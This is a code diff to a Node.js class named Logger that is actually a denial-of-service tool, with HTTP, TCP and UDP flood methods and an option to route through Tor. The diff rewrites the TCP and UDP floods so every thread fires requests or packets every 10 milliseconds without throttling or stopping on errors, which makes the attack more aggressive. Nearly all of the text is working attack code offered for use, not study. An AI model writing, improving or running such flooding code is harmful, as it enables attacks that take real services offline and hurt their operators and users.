@@ -8,8 +8,8 @@ const { exec } = require('child_process');
 const os = require('os');
 const tcpp = require('tcp-ping');
 const net = require('net');
-const tls = require('tls');
 const url = require('url');
+const dgram = require('dgram');
 
 class Logger {
     constructor() {
@@ -309,9 +309,10 @@ class Logger {
     async checkHttpStatus(target) {
         return new Promise((resolve, reject) => {
             const protocol = target.startsWith('https') ? https : http;
-            protocol.get(target, { timeout: 5000 }, (res) => {
+            const req = protocol.get(target, { timeout: 5000 }, (res) => {
                 this.setHttpStatus(res.statusCode);
                 resolve(res.statusCode);
+                req.end();
             }).on('error', (e) => {
                 console.error(`HTTP error: ${e.message}`);
                 this.setHttpStatus('Unknown');
@@ -684,6 +685,7 @@ class Logger {
                 const req = (isHTTPS ? https : http).request(options, (res) => {
                     this.updateStats(0, 100, 'Attacking', 'HTTP Flood', target, threads, torProxy, false, 0, attackRate, 'HTTP');
                     resolve();
+                    req.end();
                 });
 
                 req.on('error', (error) => {
@@ -714,83 +716,45 @@ class Logger {
 
 
     async tcpFlood(target, threads, duration, attackRate, torProxy) {
-        const makeConnection = () => {
-            return new Promise((resolve, reject) => {
-                const socket = net.createConnection({
-                    host: target,
-                    port: 80 // Default port, can be changed
-                }, () => {
-                    this.updateStats(0, 50, 'Attacking', 'TCP Flood', target, threads, torProxy, false, 0, attackRate, 'TCP');
-                    resolve(socket);
-                });
-
-                socket.on('data', (data) => {
-                    this.updateStats(0, data.length, 'Attacking', 'TCP Flood', target, threads, torProxy, false, 0, attackRate, 'TCP');
-                });
-
-                socket.on('error', (error) => {
-                    console.error(`TCP Flood error: ${error}`);
-                    this.setAttackErrorDetails(`TCP Flood error: ${error.message}`);
-                    this.stats.errors++;
-                    this.displayStats();
-                    reject(error);
-                });
-
-                socket.on('close', () => {
-                    resolve(null);
-                });
+       for (let i = 0; i < threads; i++) {
+            const socket = net.connect({
+                host: target,
+                port: 80
             });
-        };
 
-        const delay = 1000 / attackRate;
+            socket.on('connect', () => {
+                setInterval(() => {
+                    socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
+                    this.updateStats(1, 50, 'Attacking', 'TCP Flood', target, threads, torProxy, false, 0, attackRate, 'TCP');
+                }, 10);
+            });
 
-        for (let i = 0; i < threads; i++) {
-            let intervalId = setInterval(async () => {
-                try {
-                    const socket = await makeConnection();
-                    if (socket) {
-                        // Send some data to keep the connection alive
-                        socket.write('GET / HTTP/1.1\r\nHost: ' + target + '\r\n\r\n');
-                    }
-                } catch (error) {
-                    clearInterval(intervalId);
-                }
-            }, delay);
+            socket.on('error', (error) => {
+                console.error('TCP Flood error:', error);
+                this.setAttackErrorDetails(`TCP Flood error: ${error.message}`);
+                this.stats.errors++;
+                this.displayStats();
+            });
         }
     }
 
     async udpFlood(target, threads, duration, attackRate, reflectionEnabled, torProxy) {
-        const dgram = require('dgram');
         const client = dgram.createSocket('udp4');
         const message = Buffer.from('This is a UDP flood test message.');
 
-        const sendPacket = () => {
-            return new Promise((resolve, reject) => {
+        for (let i = 0; i < threads; i++) {
+            setInterval(() => {
                 client.send(message, 0, message.length, 80, target, (err) => {
                     if (err) {
                         console.error(`UDP Flood error: ${err}`);
                         this.setAttackErrorDetails(`UDP Flood error: ${err.message}`);
                         this.stats.errors++;
                         this.displayStats();
-                        reject(err);
                     } else {
                         this.updateStats(1, message.length, 'Attacking', 'UDP Flood', target, threads, torProxy, reflectionEnabled, 0, attackRate, 'UDP');
-                        resolve();
                     }
                 });
-            });
-        };
-
-        const delay = 1000 / attackRate;
-
-        for (let i = 0; i < threads; i++) {
-            let intervalId = setInterval(async () => {
-                try {
-                    await sendPacket();
-                } catch (error) {
-                    clearInterval(intervalId);
-                }
-            }, delay);
+            }, 10);
         }
     }
 
